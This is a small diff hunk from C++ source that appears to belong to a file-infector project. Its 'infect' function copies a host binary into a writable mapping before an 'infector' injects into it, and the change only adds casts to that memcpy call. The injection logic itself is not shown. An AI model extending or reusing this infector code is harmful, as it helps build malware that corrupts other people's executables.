@@ -30,7 +30,8 @@ common::FileDescriptor infect(common::Mmap<PROT_READ> host_mapping,
       infector.injected_host_size(), MAP_SHARED, output.handle(), 0);
 
   // Make a writable copy of the host.
-  vt::memcpy(output_host_mapping.mutable_base(), host_mapping.base(),
+  vt::memcpy(static_cast<void*>(output_host_mapping.mutable_base()),
+             static_cast<const void*>(host_mapping.base()),
              host_mapping.size());
 
   if (!infector.inject(std::move(output_host_mapping),
